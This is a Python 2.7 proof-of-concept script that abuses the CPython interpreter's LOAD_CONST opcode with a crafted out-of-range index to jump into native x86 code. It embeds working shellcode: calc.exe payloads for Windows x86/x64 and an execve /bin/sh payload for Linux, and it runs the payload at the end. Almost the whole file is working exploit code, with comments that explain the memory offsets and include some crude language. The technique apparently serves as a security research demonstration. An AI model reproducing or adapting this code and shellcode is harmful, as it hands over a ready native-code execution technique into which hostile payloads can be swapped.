#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
#    abuse_python27_vm_to_execute_x86_code.py - Python 2.7 opcodes & x86 shellcodes = funz
#    Copyright (C) 2013 Axel "0vercl0k" Souchet - http://www.twitter.com/0vercl0k
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

# https://twitter.com/elvanderb/status/162551396015669248 -- Challenge accepted mate!

import struct
import types
import opcode
import platform

def pack_ushort(us):
    return struct.pack('<H', us)

def pack_uint(ui):
    return struct.pack('<I', ui)

def get_opcode(o):
    return chr(opcode.opmap[o])

def exec_x86_shellcodes_via_python27_opcodes_(addr_x86_code):
    """Execute native x86 code abusing the Python VM"""

    def pull_the_trigger_b1tch():
        """Pull the trigger motherfucker"""
        pass

    const_tuple = ()
    addr_const_tuple = id(const_tuple)

    first_indirection = 'A' * 0x40 + pack_uint(addr_x86_code)
    addr_first_indirection = id(first_indirection)
    addr_first_indirection_controled_data = addr_first_indirection + 0x14

    fake_object = 'AAAA' + pack_uint(addr_first_indirection_controled_data)
    addr_fake_object = id(fake_object)
    addr_fake_object_controled = addr_fake_object + 0x14

    # In LOAD_CONST:
    # CPU Disasm
    # Address   Hex dump          Command                                  Comments
    # 1E011389    8B4C24 7C       MOV ECX,DWORD PTR [ESP+7C]
    # 1E01138D    8B7C99 0C       MOV EDI,DWORD PTR [EBX*4+ECX+0C] # EDI will be the 0xdeadbeef
    # 1E011391    8B4424 0C       MOV EAX,DWORD PTR [ESP+0C]
    # 1E011395    FF07            INC DWORD PTR [EDI]
    # 1E011397    8938            MOV DWORD PTR [EAX],EDI

    ptr_object = pack_uint(addr_fake_object_controled)
    addr_ptr_object = id(ptr_object)
    addr_ptr_data_controled = addr_ptr_object + 0x14

    # Compute the offset
    # Remember:
    # 1E01138D    8B7C99 0C       MOV EDI,DWORD PTR [EBX*4+ECX+0C] ; ECX is the address of the const_tuple object, EBX you control!
    assert((addr_ptr_data_controled - addr_const_tuple - 0xC) % 4 == 0)

    offset = ((addr_ptr_data_controled - addr_const_tuple - 0xC) & 0xffffffff) / 4
    offset_high, offset_low = offset >> 16, offset & 0xffff

    # 1. Load the low part of our address
    evil_bytecode  = get_opcode('EXTENDED_ARG') + pack_ushort(offset_high)
    # 2. Load an object from the const: This is an evil object :]
    evil_bytecode += get_opcode('LOAD_CONST') + pack_ushort(offset_low)
    # 3. Call the function on the top of stack: The evil function object :]
    evil_bytecode += get_opcode('CALL_FUNCTION') + '\x00\x00'

    pull_the_trigger_b1tch.func_code = types.CodeType(
        0,
        0,
        0,
        0,
        evil_bytecode,
        # If you want to have a conditionnal BP : '\x91' + '\x03\x30' + '\x64' + p('<H', offset_low) + '\x83\x00\x00',
        const_tuple,
        (),
        (),
        "",
        "",
        0,
        ""
    )

    # and b00m!1§1§1§
    pull_the_trigger_b1tch()

sh = None
system = platform.system()

if system == 'Windows':
    # Windows/x86 - calc.exe shellcode
    sh = '\xcc\xda\xc3\xba\x2d\xae\x01\x6b\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x33\x83\xed\xfc\x31\x55\x13\x03\x78\xbd\xe3\x9e\x7e\x29\x6a\x60\x7e\xaa\x0d\xe8\x9b\x9b\x1f\x8e\xe8\x8e\xaf\xc4\xbc\x22\x5b\x88\x54\xb0\x29\x05\x5b\x71\x87\x73\x52\x82\x29\xbc\x38\x40\x2b\x40\x42\x95\x8b\x79\x8d\xe8\xca\xbe\xf3\x03\x9e\x17\x78\xb1\x0f\x13\x3c\x0a\x31\xf3\x4b\x32\x49\x76\x8b\xc7\xe3\x79\xdb\x78\x7f\x31\xc3\xf3\x27\xe2\xf2\xd0\x3b\xde\xbd\x5d\x8f\x94\x3c\xb4\xc1\x55\x0f\xf8\x8e\x6b\xa0\xf5\xcf\xac\x06\xe6\xa5\xc6\x75\x9b\xbd\x1c\x04\x47\x4b\x81\xae\x0c\xeb\x61\x4f\xc0\x6a\xe1\x43\xad\xf9\xad\x47\x30\x2d\xc6\x73\xb9\xd0\x09\xf2\xf9\xf6\x8d\x5f\x59\x96\x94\x05\x0c\xa7\xc7\xe1\xf1\x0d\x83\x03\xe5\x34\xce\x49\xf8\xb5\x74\x34\xfa\xc5\x76\x16\x93\xf4\xfd\xf9\xe4\x08\xd4\xbe\x1b\x43\x75\x96\xb3\x0a\xef\xab\xd9\xac\xc5\xef\xe7\x2e\xec\x8f\x13\x2e\x85\x8a\x58\xe8\x75\xe6\xf1\x9d\x79\x55\xf1\xb7\x19\x38\x61\x5b\xf0\xdf\x01\xfe\x0c'
    # Windows/x64 - calc.exe shellcode
    # sh = '\xcc\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\x51\xf9\xbe\x41\x37\xe7\x03\x35\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xad\xb1\x3d\xa5\xc7\x0f\xc3\x35\x51\xf9\xff\x10\x76\xb7\x51\x64\x07\xb1\x8f\x93\x52\xaf\x88\x67\x31\xb1\x35\x13\x2f\xaf\x88\x67\x71\xb1\x35\x33\x67\xaf\x0c\x82\x1b\xb3\xf3\x70\xfe\xaf\x32\xf5\xfd\xc5\xdf\x3d\x35\xcb\x23\x74\x90\x30\xb3\x00\x36\x26\xe1\xd8\x03\xb8\xef\x09\xbc\xb5\x23\xbe\x13\xc5\xf6\x40\xe7\x6c\x83\xbd\x51\xf9\xbe\x09\xb2\x27\x77\x52\x19\xf8\x6e\x11\xbc\xaf\x1b\x71\xda\xb9\x9e\x08\x36\x37\xe0\x63\x19\x06\x77\x00\xbc\xd3\x8b\x7d\x50\x2f\xf3\x70\xfe\xaf\x32\xf5\xfd\xb8\x7f\x88\x3a\xa6\x02\xf4\x69\x19\xcb\xb0\x7b\xe4\x4f\x11\x59\xbc\x87\x90\x42\x3f\x5b\x71\xda\xb9\x9a\x08\x36\x37\x65\x74\xda\xf5\xf6\x05\xbc\xa7\x1f\x7c\x50\x29\xff\xca\x33\x6f\x4b\x34\x81\xb8\xe6\x00\x6f\xb9\x5a\x6f\x10\xa1\xff\x18\x76\xbd\x4b\xb6\xbd\xd9\xff\x13\xc8\x07\x5b\x74\x08\xa3\xf6\xca\x25\x0e\x54\xca\xae\x06\xe3\x09\x8d\xe6\x03\x35\x51\xf9\xbe\x41\x37\xaf\x8e\xb8\x50\xf8\xbe\x41\x76\x5d\x32\xbe\x3e\x7e\x41\x94\x8c\x17\xb6\x97\x07\xb8\x04\xe7\xa2\x5a\x9e\xca\x84\xb1\x3d\x85\x1f\xdb\x05\x49\x5b\x79\x45\xa1\x42\xe2\xb8\x72\x42\x8b\xd1\x2b\x37\xbe\x42\xbc\x8b\x06\x6b\x22\x56\x8b\x60\x1b\x34\x81\xdb\x41\x37\xe7\x03\x35'
elif system == 'Linux':
    # Linux/x86 - execve /bin/sh - 21 bytes
    sh = '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'
else:
    sh = '\xcc'

# +X the string object ?

# The string of a PyStringObject is stored at the offset 0x14
# typedef struct
# {
#     PyObject_VAR_HEAD
#     long ob_shash;
#     int ob_sstate;
#     char ob_sval[1]; // <- OUR STR1NGZ
# } PyStringObject;
address_shellcode = id(sh) + 0x14
exec_x86_shellcodes_via_python27_opcodes_(address_shellcode)